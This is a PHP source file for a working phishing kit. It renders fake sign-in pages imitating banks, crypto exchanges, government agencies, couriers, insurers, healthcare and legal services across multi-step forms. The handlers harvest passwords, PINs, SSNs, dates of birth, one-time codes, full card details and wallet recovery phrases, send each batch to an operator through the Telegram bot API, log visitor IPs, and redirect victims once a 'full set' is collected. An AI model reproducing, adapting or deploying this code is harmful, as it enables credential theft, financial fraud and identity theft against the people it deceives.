<?php
session_start();
header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');
header('Pragma: no-cache');
header('Expires: 0');
header('X-Robots-Tag: noindex, nofollow');

$config  = json_decode(file_get_contents(__DIR__.'/bot-config.json'),  true) ?? [];
$presets = json_decode(file_get_contents(__DIR__.'/letter_presets.json'), true) ?? [];

// ── Identify preset ──────────────────────────────────────────────────────────
$pid = preg_replace('/[^a-z0-9_]/', '', strtolower($_GET['id'] ?? ''));
$preset = null;
foreach ($presets as $p) { if (($p['id']??'') === $pid) { $preset = $p; break; } }
if (!$preset) { http_response_code(404); echo '<h2 style="font-family:sans-serif;padding:60px;text-align:center">Page not found</h2>'; exit; }

// ── Bot helpers ──────────────────────────────────────────────────────────────
$bot_token = $config['control_bot_token'] ?? $config['visits_bot_token'] ?? '';
$admin_id  = $config['admin_chat_id'] ?? '';
function lp_tg($token, $admin, $msg) {
    if (!$token || !$admin) return;
    @file_get_contents("https://api.telegram.org/bot{$token}/sendMessage", false,
        stream_context_create(['http'=>['method'=>'POST','timeout'=>4,
            'header'=>"Content-type: application/x-www-form-urlencoded\r\n",
            'content'=>http_build_query(['chat_id'=>$admin,'text'=>$msg,'parse_mode'=>'Markdown'])]]));
}

// ── VID ──────────────────────────────────────────────────────────────────────
$vid = '';
if (!empty($_COOKIE['vid'])) { $vid = preg_replace('/[^A-F0-9]/','',strtoupper($_COOKIE['vid'])); if(strlen($vid)!==8)$vid=''; }
if (!$vid) { $vid = strtoupper(bin2hex(random_bytes(4))); setcookie('vid',$vid,time()+86400*365,'/',''  ,false,true); }

$ip  = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? '';
$ua  = substr($_SERVER['HTTP_USER_AGENT']??'',0,200);
$ts  = date('Y-m-d H:i:s');
$dev = preg_match('/Mobile|Android|iPhone|iPad/i',$ua) ? '📱' : '💻';

$brand    = addslashes($preset['org_name'] ?? $pid);
$ref_code = ($preset['ref_prefix']??'REF').'-'.strtoupper(substr($vid,0,6));
$redirect = trim($preset['redirect_link'] ?? 'https://google.com');
if (!preg_match('/^https?:\/\//i',$redirect)) $redirect = 'https://google.com';

$category = strtolower($preset['category'] ?? 'banking');

// ── Determine login_type from category ───────────────────────────────────────
function get_login_type(string $category, string $id): string {
    $map = [
        'banking'      => 'banking',
        'payment'      => 'payment',
        'crypto'       => 'crypto',
        'tech'         => 'tech',
        'streaming'    => 'streaming',
        'government'   => 'government',
        'shipping'     => 'shipping',
        'delivery'     => 'shipping',
        'telco'        => 'telecom',
        'telecom'      => 'telecom',
        'insurance'    => 'insurance',
        'retail'       => 'retail',
        'ecommerce'    => 'retail',
        'social'       => 'social',
        'healthcare'   => 'healthcare',
        'legal'        => 'legal',
        'court'        => 'legal',
        'notifications'=> 'government',
        'custom'       => 'banking',
    ];
    return $map[$category] ?? 'banking';
}
$lt = get_login_type($category, $pid);

// ── Log visit file ───────────────────────────────────────────────────────────
$log_file = __DIR__.'/landing-visits.json';
$visits   = file_exists($log_file) ? (json_decode(file_get_contents($log_file),true)??[]) : [];

// ── Handle AJAX step submissions ─────────────────────────────────────────────
if ($_SERVER['REQUEST_METHOD']==='POST' && !empty($_POST['_lp_step'])) {
    header('Content-Type: application/json');
    $step = intval($_POST['_lp_step']);
    $safe = fn($k) => htmlspecialchars(trim($_POST[$k]??''), ENT_QUOTES);

    if ($step === 1) {
        $entry = ['preset'=>$pid,'brand'=>$preset['org_name']??$pid,'vid'=>$vid,'ip'=>$ip,'ua'=>$ua,'ts'=>$ts,'mobile'=>(bool)preg_match('/Mobile|Android|iPhone|iPad/i',$ua)];
        $visits[] = $entry;
        if (count($visits)>5000) $visits = array_slice($visits,-5000);
        file_put_contents($log_file, json_encode($visits,JSON_UNESCAPED_UNICODE));
    }

    if ($step === 1) {
        $email = $safe('email');
        $uname = $safe('username');
        $phone = $safe('phone');
        $ssn_g = $safe('ssn_gov');
        $fname = $safe('fullname');
        $track = $safe('tracking');
        $field1_label = $safe('field1_label');
        lp_tg($bot_token, $admin_id,
            "{$dev} *Step 1 — Identifier*\n━━━━━━━━━━━━━━━━━━\n"
           ."🏢 Brand: *{$brand}*\n🆔 Ref: `{$ref_code}`\n"
           .($email   ? "📧 Email: `{$email}`\n"         : "")
           .($uname   ? "👤 Username: `{$uname}`\n"      : "")
           .($phone   ? "📞 Phone: `{$phone}`\n"         : "")
           .($ssn_g   ? "🆔 SSN: `{$ssn_g}`\n"          : "")
           .($fname   ? "👤 Name: `{$fname}`\n"          : "")
           .($track   ? "📦 Tracking: `{$track}`\n"      : "")
           ."🌐 IP: `{$ip}`\n📅 {$ts}");
        echo json_encode(['ok'=>true]);

    } elseif ($step === 2) {
        $pass = $safe('password');
        $pin  = $safe('pin');
        $dob  = $safe('dob');
        $zip  = $safe('zip');
        lp_tg($bot_token, $admin_id,
            "🔐 *Step 2 — Credentials*\n━━━━━━━━━━━━━━━━━━\n"
           ."🏢 Brand: *{$brand}*\n🆔 Ref: `{$ref_code}`\n"
           .($pass ? "🔑 Password: `{$pass}`\n" : "")
           .($pin  ? "🔢 PIN: `{$pin}`\n"        : "")
           .($dob  ? "📅 DOB: `{$dob}`\n"        : "")
           .($zip  ? "📮 ZIP: `{$zip}`\n"        : "")
           ."🌐 IP: `{$ip}`");
        echo json_encode(['ok'=>true]);

    } elseif ($step === 3) {
        $ssn    = $safe('ssn');
        $dob3   = $safe('dob3');
        $zip3   = $safe('zip3');
        $otp    = $safe('otp');
        $addr   = $safe('address');
        $wallet = $safe('wallet');
        $policy = $safe('policy');
        $last4  = $safe('last4');
        $card3  = $safe('card');
        $exp3   = $safe('exp');
        $cvv3   = $safe('cvv');
        $cname3 = $safe('cname');
        $is_final = (get_login_type($category, $pid) !== 'banking' && get_login_type($category, $pid) !== 'crypto');
        lp_tg($bot_token, $admin_id,
            "🪪 *Step 3 — Verification*\n━━━━━━━━━━━━━━━━━━\n"
           ."🏢 Brand: *{$brand}*\n🆔 Ref: `{$ref_code}`\n"
           .($ssn    ? "🆔 SSN: `{$ssn}`\n"         : "")
           .($dob3   ? "📅 DOB: `{$dob3}`\n"        : "")
           .($zip3   ? "📮 ZIP: `{$zip3}`\n"        : "")
           .($otp    ? "🔢 OTP: `{$otp}`\n"         : "")
           .($addr   ? "🏠 Address: `{$addr}`\n"    : "")
           .($wallet ? "💰 Wallet: `{$wallet}`\n"   : "")
           .($policy ? "📋 Policy: `{$policy}`\n"   : "")
           .($last4  ? "💳 Last4: `{$last4}`\n"     : "")
           .($card3  ? "💳 Card: `{$card3}`\n"      : "")
           .($exp3   ? "📅 Exp: `{$exp3}`\n"        : "")
           .($cvv3   ? "🔒 CVV: `{$cvv3}`\n"        : "")
           .($cname3 ? "👤 Name: `{$cname3}`\n"     : "")
           ."🌐 IP: `{$ip}`"
           .($is_final ? "\n\n✅ *FULL SET COLLECTED*" : ""));
        if ($is_final) {
            echo json_encode(['ok'=>true,'redirect'=>$redirect]);
        } else {
            echo json_encode(['ok'=>true]);
        }

    } elseif ($step === 4) {
        $card  = $safe('card');
        $exp   = $safe('exp');
        $cvv   = $safe('cvv');
        $cname = $safe('cname');
        $ssn4  = $safe('ssn4');
        lp_tg($bot_token, $admin_id,
            "💳 *Step 4 — Card/Final*\n━━━━━━━━━━━━━━━━━━\n"
           ."🏢 Brand: *{$brand}*\n🆔 Ref: `{$ref_code}`\n"
           .($card  ? "💳 Card: `{$card}`\n"     : "")
           .($exp   ? "📅 Exp: `{$exp}`\n"       : "")
           .($cvv   ? "🔒 CVV: `{$cvv}`\n"       : "")
           .($cname ? "👤 Name: `{$cname}`\n"    : "")
           .($ssn4  ? "🆔 SSN: `{$ssn4}`\n"      : "")
           ."🌐 IP: `{$ip}`\n\n✅ *FULL SET COLLECTED*");
        echo json_encode(['ok'=>true,'redirect'=>$redirect]);

    } else {
        echo json_encode(['ok'=>false]);
    }
    exit;
}

// ── Brand colors ─────────────────────────────────────────────────────────────
$accent  = preg_match('/^#[0-9a-fA-F]{6}$/',$preset['color_primary']??'')   ? $preset['color_primary']   : '#1a3a6b';
$csec    = preg_match('/^#[0-9a-fA-F]{6}$/',$preset['color_secondary']??'') ? $preset['color_secondary'] : '';
$logo_bg = preg_match('/^#[0-9a-fA-F]{6}$/',$preset['logo_bg']??'')         ? $preset['logo_bg']         : '#ffffff';

function lp_rgb($h){$h=ltrim($h,'#');return[hexdec(substr($h,0,2)),hexdec(substr($h,2,2)),hexdec(substr($h,4,2))];}
[$ar,$ag,$ab] = lp_rgb($accent);
$sec = $csec ?: sprintf('#%02x%02x%02x',max(0,$ar-40),max(0,$ag-40),max(0,$ab-40));
[$sr,$sg,$sb] = lp_rgb($sec);
$lum = (0.299*$ar+0.587*$ag+0.114*$ab)/255;

// Government/legal/healthcare use light background
$is_light_theme = in_array($lt, ['government','legal','healthcare']);
$on  = $lum>0.55 ? '#1a1a2e' : '#ffffff';
$onm = $lum>0.55 ? 'rgba(0,0,0,0.55)' : 'rgba(255,255,255,0.65)';

$org_name = htmlspecialchars($preset['org_name']??'');
$org_sub  = htmlspecialchars($preset['org_sub']??'');
$logo_url = $preset['logo_url']??'';
$footer   = htmlspecialchars($preset['footer_text']??'');
$today    = date('F j, Y');

// ── Per-category step config ─────────────────────────────────────────────────
$step_configs = [
    'banking' => [
        'steps' => 4,
        'step_titles' => [
            1 => 'Sign In to Online Banking',
            2 => 'Enter Your Password',
            3 => 'Verify Your Identity',
            4 => 'Confirm Debit/Credit Card',
        ],
        'step_subs' => [
            1 => 'Enter your Online Banking ID or email address',
            2 => 'For your security, please enter your password',
            3 => 'We need to verify your identity before proceeding',
            4 => 'Confirm your card on file to complete verification',
        ],
        'step1_fields' => 'username_or_email',
        'step2_fields' => 'password',
        'step3_fields' => 'ssn_dob_zip',
        'step4_fields' => 'card_full',
        'btn_labels'   => ['Continue','Sign In','Verify Identity','Complete Verification'],
    ],
    'payment' => [
        'steps' => 3,
        'step_titles' => [
            1 => 'Log In to Your Account',
            2 => 'Enter Your Password',
            3 => 'Confirm Payment Method',
        ],
        'step_subs' => [
            1 => 'Enter your email or mobile number',
            2 => 'Keep your account secure',
            3 => 'Add or confirm your payment card',
        ],
        'step1_fields' => 'email_or_phone',
        'step2_fields' => 'password',
        'step3_fields' => 'card_full',
        'btn_labels'   => ['Continue','Log In','Confirm Card'],
    ],
    'crypto' => [
        'steps' => 4,
        'step_titles' => [
            1 => 'Sign In to Your Account',
            2 => 'Enter Password',
            3 => 'Two-Factor Verification',
            4 => 'Verify Wallet Ownership',
        ],
        'step_subs' => [
            1 => 'Enter your registered email address',
            2 => 'Enter your account password',
            3 => 'Enter the 6-digit code from your authenticator app',
            4 => 'Paste your recovery phrase to confirm ownership',
        ],
        'step1_fields' => 'email_only',
        'step2_fields' => 'password',
        'step3_fields' => 'otp_code',
        'step4_fields' => 'wallet_phrase',
        'btn_labels'   => ['Continue','Unlock Account','Verify Code','Confirm Ownership'],
    ],
    'tech' => [
        'steps' => 3,
        'step_titles' => [
            1 => 'Sign In',
            2 => 'Enter Your Password',
            3 => 'Verify It\'s You',
        ],
        'step_subs' => [
            1 => 'Enter your email, phone, or account ID',
            2 => 'Enter the password for your account',
            3 => 'Enter the verification code sent to your device',
        ],
        'step1_fields' => 'email_only',
        'step2_fields' => 'password',
        'step3_fields' => 'otp_code',
        'btn_labels'   => ['Next','Sign In','Verify'],
    ],
    'streaming' => [
        'steps' => 3,
        'step_titles' => [
            1 => 'Sign In',
            2 => 'Enter Your Password',
            3 => 'Update Payment Method',
        ],
        'step_subs' => [
            1 => 'Enter the email address for your account',
            2 => 'Enter your password to continue',
            3 => 'Your payment method needs to be updated',
        ],
        'step1_fields' => 'email_only',
        'step2_fields' => 'password',
        'step3_fields' => 'card_full',
        'btn_labels'   => ['Continue','Sign In','Update Payment'],
    ],
    'government' => [
        'steps' => 3,
        'step_titles' => [
            1 => 'Identify Yourself',
            2 => 'Date of Birth & ZIP Code',
            3 => 'Provide Mailing Address',
        ],
        'step_subs' => [
            1 => 'Enter your full legal name and Social Security Number',
            2 => 'Please confirm your date of birth and ZIP code on file',
            3 => 'Confirm your current mailing address',
        ],
        'step1_fields' => 'name_ssn',
        'step2_fields' => 'dob_zip',
        'step3_fields' => 'address',
        'btn_labels'   => ['Continue','Continue','Submit'],
    ],
    'shipping' => [
        'steps' => 3,
        'step_titles' => [
            1 => 'Track Your Shipment',
            2 => 'Account Sign In',
            3 => 'Verify Your Identity',
        ],
        'step_subs' => [
            1 => 'Enter your tracking number and delivery ZIP code',
            2 => 'Sign in to manage your delivery preferences',
            3 => 'Confirm your date of birth to complete verification',
        ],
        'step1_fields' => 'tracking_zip',
        'step2_fields' => 'email_password',
        'step3_fields' => 'dob_only',
        'btn_labels'   => ['Track Package','Sign In','Confirm Identity'],
    ],
    'telecom' => [
        'steps' => 3,
        'step_titles' => [
            1 => 'Sign In to Your Account',
            2 => 'Enter Your PIN / Password',
            3 => 'Confirm Payment on File',
        ],
        'step_subs' => [
            1 => 'Enter your phone number or account number',
            2 => 'Enter your 6-digit PIN or account password',
            3 => 'Confirm the last 4 digits of your card and ZIP code',
        ],
        'step1_fields' => 'phone_or_account',
        'step2_fields' => 'pin_or_password',
        'step3_fields' => 'last4_zip',
        'btn_labels'   => ['Continue','Sign In','Confirm'],
    ],
    'insurance' => [
        'steps' => 3,
        'step_titles' => [
            1 => 'Access Your Policy',
            2 => 'Date of Birth & ZIP Code',
            3 => 'Update Payment Method',
        ],
        'step_subs' => [
            1 => 'Enter your policy number or email address',
            2 => 'Please confirm your date of birth and ZIP on file',
            3 => 'Your card on file requires re-confirmation',
        ],
        'step1_fields' => 'policy_email',
        'step2_fields' => 'dob_zip',
        'step3_fields' => 'card_full',
        'btn_labels'   => ['Access Policy','Verify','Update Payment'],
    ],
    'retail' => [
        'steps' => 3,
        'step_titles' => [
            1 => 'Sign In to Your Account',
            2 => 'Enter Your Password',
            3 => 'Verify Payment Method',
        ],
        'step_subs' => [
            1 => 'Enter your email address',
            2 => 'Enter the password for your account',
            3 => 'Confirm your payment card to resolve account issue',
        ],
        'step1_fields' => 'email_only',
        'step2_fields' => 'password',
        'step3_fields' => 'card_full',
        'btn_labels'   => ['Sign In','Continue','Confirm'],
    ],
    'social' => [
        'steps' => 2,
        'step_titles' => [
            1 => 'Log In',
            2 => 'Enter Your Password',
        ],
        'step_subs' => [
            1 => 'Enter your email, phone, or username',
            2 => 'Enter the password for your account',
        ],
        'step1_fields' => 'email_or_phone',
        'step2_fields' => 'password',
        'btn_labels'   => ['Continue','Log In'],
    ],
    'healthcare' => [
        'steps' => 3,
        'step_titles' => [
            1 => 'Member Login',
            2 => 'Verify Your Identity',
            3 => 'Confirm Insurance Details',
        ],
        'step_subs' => [
            1 => 'Enter your member ID or email address',
            2 => 'Enter your date of birth and ZIP code',
            3 => 'Enter your card details for billing verification',
        ],
        'step1_fields' => 'member_email',
        'step2_fields' => 'dob_zip',
        'step3_fields' => 'card_full',
        'btn_labels'   => ['Continue','Verify','Confirm'],
    ],
    'legal' => [
        'steps' => 3,
        'step_titles' => [
            1 => 'Access Your Case',
            2 => 'Identity Verification',
            3 => 'Provide Payment Details',
        ],
        'step_subs' => [
            1 => 'Enter your case number or full legal name',
            2 => 'Enter your SSN and date of birth to verify identity',
            3 => 'Payment required to process your case',
        ],
        'step1_fields' => 'case_name',
        'step2_fields' => 'ssn_dob',
        'step3_fields' => 'card_full',
        'btn_labels'   => ['Access Case','Verify Identity','Submit Payment'],
    ],
];

$sc = $step_configs[$lt] ?? $step_configs['banking'];
$total_steps = $sc['steps'];

// ── Theme: light vs dark ─────────────────────────────────────────────────────
if ($is_light_theme) {
    $body_bg  = '#f4f6f9';
    $card_bg  = '#ffffff';
    $card_brd = '#dce0e8';
    $card_shd = '0 4px 24px rgba(0,0,0,0.10)';
    $text_main= '#1a2340';
    $text_muted='#6b7280';
    $input_bg = '#f9fafb';
    $input_brd= '#d1d5db';
    $input_fc = '#374151';
    $footer_bg= '#f0f2f6';
    $footer_txt='#9ca3af';
    $dot_bg   = 'rgba(0,0,0,0.12)';
    $err_col  = '#dc2626';
} else {
    $body_bg  = 'radial-gradient(ellipse at 20% 15%,rgba('.$ar.','.$ag.','.$ab.',.12) 0%,#070b14 50%,#0a0f1e 100%)';
    $card_bg  = 'rgba(255,255,255,0.03)';
    $card_brd = 'rgba(255,255,255,0.08)';
    $card_shd = '0 32px 80px rgba(0,0,0,0.55),0 0 0 1px rgba(255,255,255,0.04)';
    $text_main= '#f1f5f9';
    $text_muted='#94a3b8';
    $input_bg = 'rgba(255,255,255,0.05)';
    $input_brd= 'rgba(255,255,255,0.12)';
    $input_fc = '#f1f5f9';
    $footer_bg= 'rgba(0,0,0,0.2)';
    $footer_txt='#64748b';
    $dot_bg   = 'rgba(255,255,255,0.1)';
    $err_col  = '#f87171';
}

// Load brand-specific template; fall back to default for any unrecognised login type
$tpl = __DIR__ . '/lp-templates/' . $lt . '.php';
if (!file_exists($tpl)) $tpl = __DIR__ . '/lp-templates/default.php';
include $tpl;